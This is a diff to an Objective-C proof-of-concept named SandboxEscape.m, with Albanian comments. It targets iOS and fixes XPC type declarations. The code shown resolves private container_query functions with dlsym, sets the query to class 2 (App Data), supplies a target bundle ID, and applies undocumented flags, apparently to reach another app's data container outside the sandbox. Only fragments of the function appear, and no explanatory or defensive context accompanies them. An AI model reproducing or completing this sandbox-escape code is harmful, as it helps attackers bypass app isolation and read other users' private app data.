@@ -1,12 +1,10 @@
 // SandboxEscape.m / ObjC / arm64 / MobileHouseArrest PoC (Class 2)
 #import "SandboxEscape.h"
 #import <dlfcn.h>
+#import <xpc/xpc.h> // Përdorim librarinë standarde të Apple për XPC
 
 typedef void *container_query_t; 
 typedef void *container_object_t;
-
-// Nuk e ripërcaktojmë më xpc_object_t, përdorim void*
-extern void *xpc_string_create(const char *string);
 
 @interface SandboxEscape () { int64_t _handle; BOOL _escaped; } @end
 
@@ -24,7 +22,8 @@ extern void *xpc_string_create(const char *string);
     
     container_query_t (*query_create)(void) = dlsym(h, "container_query_create");
     void (*query_set_class)(container_query_t, unsigned) = dlsym(h, "container_query_set_class");
-    void (*query_set_ids)(container_query_t, void *) = dlsym(h, "container_query_set_ids"); // Ndryshuar në void*
+    // Tani përdorim xpc_object_t të vërtetë nga Apple, pa konflikte
+    void (*query_set_ids)(container_query_t, xpc_object_t) = dlsym(h, "container_query_set_ids");
     void (*query_set_flags)(container_query_t, uint64_t) = dlsym(h, "container_query_set_flags");
     void (*query_set_part)(container_query_t, uint64_t) = dlsym(h, "container_query_set_part"); 
     
@@ -44,7 +43,8 @@ extern void *xpc_string_create(const char *string);
     // 3. Konfiguro sipas PoC
     query_set_class(q, 2); // Klasa 2 = App Data
     
-    void *identifier = xpc_string_create(bundleID.UTF8String); // Ndryshuar në void*
+    // Përdorim funksionin standard xpc_string_create të Apple
+    xpc_object_t identifier = xpc_string_create(bundleID.UTF8String);
     query_set_ids(q, identifier);
     
     query_set_flags(q, UINT64_C(0x900000000));
